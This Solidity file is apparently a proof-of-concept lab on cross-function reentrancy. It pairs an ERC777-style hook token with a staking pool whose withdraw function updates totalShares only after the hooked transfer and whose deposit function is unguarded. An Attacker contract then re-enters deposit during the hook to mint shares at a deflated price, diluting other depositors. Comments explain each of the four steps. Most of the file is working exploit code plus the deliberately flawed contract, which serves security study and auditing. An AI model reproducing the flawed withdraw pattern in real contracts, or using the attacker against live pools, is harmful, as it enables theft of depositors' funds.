// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/// @title HookToken — minimal ERC777-style token with a `tokensReceived` hook.
///         Models real hook-capable assets (ERC777 family: e.g. imBTC-style /
///         stETH-adjacent wrappers). Plain-ERC20 assumptions in the pool break.
interface IERC777Recipient {
    function tokensReceived(address operator, address from, address to, uint256 amount, bytes calldata data)
        external;
}

contract HookToken {
    string public constant name = "Hook Token";
    string public constant symbol = "HOOK";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // ERC777-style granularity: recipients implementing IERC777Recipient get hooked.
    mapping(address => bool) public isHookRecipient;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function registerHook() external {
        isHookRecipient[msg.sender] = true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        if (isHookRecipient[to]) {
            IERC777Recipient(to).tokensReceived(msg.sender, msg.sender, to, amount, "");
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        if (isHookRecipient[to]) {
            IERC777Recipient(to).tokensReceived(msg.sender, from, to, amount, "");
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

/// @title StakingPool — a staking vault that shares `totalShares` across
///        `deposit` / `withdraw`, and applies the reentrancy guard ONLY to
///        `withdraw`. `deposit` is left unguarded because "deposits are safe".
///
/// THE BUG (cross-function reentrancy, §AJ four-step):
///   1. Callback point  : `HookToken.transfer` fires `tokensReceived` on the
///                        pool mid-`withdraw`.
///   2. Guard boundary  : `nonReentrant` covers only `withdraw`; `deposit`
///                        re-enters freely from inside the hook.
///   3. Finalization    : `totalShares -= shares` happens AFTER the external
///                        call → during the hook, `balanceOf(pool)` is already
///                        reduced but `totalShares` is stale-high.
///   4. Window delta    : `sharePrice = balanceOf(pool) * 1e18 / totalShares`
///                        is temporarily DEFLATED → reentrant `deposit` mints
///                        shares at a discount, diluting other depositors.
contract StakingPool {
    HookToken public immutable asset;

    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    uint256 private locked = 1;

    error Reentrancy();

    modifier nonReentrant() {
        if (locked == 0) revert Reentrancy();
        locked = 0;
        _;
        locked = 1;
    }

    constructor(HookToken _asset) {
        asset = _asset;
    }

    function sharePrice() public view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (asset.balanceOf(address(this)) * 1e18) / totalShares;
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        shares = (amount * 1e18) / sharePrice(); // ← re-entrant entry point
        asset.transferFrom(msg.sender, address(this), amount);
        sharesOf[msg.sender] += shares;
        totalShares += shares;
    }

    function withdraw(uint256 shares) external nonReentrant returns (uint256 amount) {
        amount = (shares * sharePrice()) / 1e18;
        sharesOf[msg.sender] -= shares;
        asset.transfer(msg.sender, amount); // ← HOOK fires here…
        totalShares -= shares;              // ← …BEFORE this finalization
    }
}

/// @title Attacker — contract that re-enters `StakingPool.deposit` from inside
///        the `tokensReceived` hook while `totalShares` is stale-high.
contract Attacker is IERC777Recipient {
    StakingPool public immutable pool;
    address public immutable owner;

    uint256 public reentered; // guard so the PoC terminates deterministically

    constructor(StakingPool _pool) {
        pool = _pool;
        owner = msg.sender;
        HookToken(address(_pool.asset())).registerHook();
        HookToken(address(_pool.asset())).approve(address(_pool), type(uint256).max);
    }

    /// @notice entry: deposit from THIS contract so the withdraw hook lands here.
    ///         Requires the owner to have approved this contract on the token.
    function stake(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        HookToken(address(pool.asset())).transferFrom(owner, address(this), amount);
        pool.deposit(amount);
    }

    /// @notice trigger: withdrawing fires `tokensReceived` on this contract.
    function unstake(uint256 shares) external {
        require(msg.sender == owner, "only owner");
        reentered = 0; // allow one re-entry per withdraw round
        pool.withdraw(shares);
    }

    function tokensReceived(address, address from, address, uint256, bytes calldata) external {
        if (msg.sender != address(pool.asset())) return; // only token-driven calls
        if (from != address(pool)) return;               // only the pool's withdraw payout
        if (reentered >= 1) return;                      // one re-entrancy per withdraw round
        reentered++;

        uint256 priceDuringHook = pool.sharePrice();
        // Price is deflated inside the hook: balanceOf(pool) already reduced,
        // totalShares not yet. Deposit the just-withdrawed tokens at the discount.
        uint256 stash = HookToken(address(pool.asset())).balanceOf(address(this));
        if (stash > 0) pool.deposit(stash);

        // sanity: the intra-hook price must be strictly below par
        require(priceDuringHook < 1e18, "price not deflated during hook");
    }
}
